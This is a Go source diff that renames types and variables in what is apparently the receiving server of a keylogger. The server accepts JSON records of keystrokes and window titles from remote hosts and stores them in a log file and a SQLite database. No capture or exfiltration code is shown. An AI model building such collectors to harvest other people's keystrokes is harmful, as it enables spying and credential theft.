@@ -25,7 +25,7 @@ const (
 
 	logFile    = "keylogger.log"
 	logDB      = "keylogger.db"
-	driver     = "sqlite3"
+	logDriver  = "sqlite3"
 	LogFormat  = "%s [%s] <%s> %s\n"
 	TimeFormat = "2006.01.02 15:04:05.000"
 
@@ -35,7 +35,7 @@ const (
 	query  = "INSERT INTO `keylogger` (`k_time`, `k_addr`, `k_type`, `k_title`, `k_value`) VALUES (?, ?, ?, ?, ?);"
 )
 
-type keyLog struct {
+type KeyLog struct {
 	Time  int64  `json:"time"`
 	Type  string `json:"type"`
 	Title string `json:"title"`
@@ -43,14 +43,14 @@ type keyLog struct {
 }
 
 // writeLog appends data to the log file.
-func (k keyLog) writeLog(raddr string) {
+func (keyLog KeyLog) writeLog(raddr string) {
 	// Format data for writing.
-	data := fmt.Sprintf(LogFormat, time.UnixMilli(k.Time).Format(TimeFormat), raddr, k.Type, k.Value)
+	data := fmt.Sprintf(LogFormat, time.UnixMilli(keyLog.Time).Format(TimeFormat), raddr, keyLog.Type, keyLog.Value)
 	// Open file to append data, create if file does not exist.
 	file, err := os.OpenFile(logFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
 	if err != nil {
 		fmt.Printf("Failed to opean file: %s\n", err.Error())
-		fmt.Printf("Received data: %#v\n", k)
+		fmt.Printf("Received data: %#v\n", keyLog)
 		return
 	}
 	defer file.Close()
@@ -58,32 +58,32 @@ func (k keyLog) writeLog(raddr string) {
 	_, err = file.WriteString(data)
 	if err != nil {
 		fmt.Printf("Failed to write file: %s\n", err.Error())
-		fmt.Printf("Received Data: %#v\n", k)
+		fmt.Printf("Received Data: %#v\n", keyLog)
 		return
 	}
 }
 
 // writeDB inserts data into the database.
-func (k keyLog) writeDB(raddr string) {
-	db, err := sql.Open(driver, logDB)
+func (keyLog KeyLog) writeDB(raddr string) {
+	db, err := sql.Open(logDriver, logDB)
 	if err != nil {
 		fmt.Printf("Failed to open database: %s\n", err.Error())
-		fmt.Printf("Received data: %#v\n", k)
+		fmt.Printf("Received data: %#v\n", keyLog)
 		return
 	}
 	defer db.Close()
-	_, err = db.Exec(query, k.Time, raddr, k.Type, k.Title, k.Value)
+	_, err = db.Exec(query, keyLog.Time, raddr, keyLog.Type, keyLog.Title, keyLog.Value)
 	if err != nil {
 		fmt.Printf("Failed to insert data: %s\n", err.Error())
-		fmt.Printf("Received Data: %#v\n", k)
+		fmt.Printf("Received Data: %#v\n", keyLog)
 		return
 	}
 }
 
 // writeBoth appends data to the log file and inserts data into the database.
-func (k keyLog) writeBoth(raddr string) {
-	k.writeLog(raddr)
-	k.writeDB(raddr)
+func (keyLog KeyLog) writeBoth(raddr string) {
+	keyLog.writeLog(raddr)
+	keyLog.writeDB(raddr)
 }
 
 func main() {
@@ -129,7 +129,7 @@ func main() {
 			fmt.Printf("Failed to read: %s\n", e.Error())
 			continue
 		}
-		var keyLogs []keyLog
+		var keyLogs []KeyLog
 		// Unserialise buffer to keyLog slice.
 		e = json.Unmarshal(buffer[:n], &keyLogs)
 		if e != nil {
@@ -138,14 +138,14 @@ func main() {
 			continue
 		}
 		// Traverse and write data to file according to the mode.
-		for _, k := range keyLogs {
+		for _, keyLog := range keyLogs {
 			switch mode {
 			case ModeLog:
-				k.writeLog(conn.RemoteAddr().String())
+				keyLog.writeLog(conn.RemoteAddr().String())
 			case ModeDB:
-				k.writeDB(conn.RemoteAddr().String())
+				keyLog.writeDB(conn.RemoteAddr().String())
 			case ModeBoth:
-				k.writeBoth(conn.RemoteAddr().String())
+				keyLog.writeBoth(conn.RemoteAddr().String())
 			}
 		}
 		_ = conn.Close()
@@ -155,7 +155,7 @@ func main() {
 // initDB creates table in database.
 func initDB() {
 	// Open database.
-	db, err := sql.Open(driver, logDB)
+	db, err := sql.Open(logDriver, logDB)
 	if err != nil {
 		fmt.Printf("Failed to open database: %s\n", err.Error())
 		fmt.Println("Cannot initialise database")
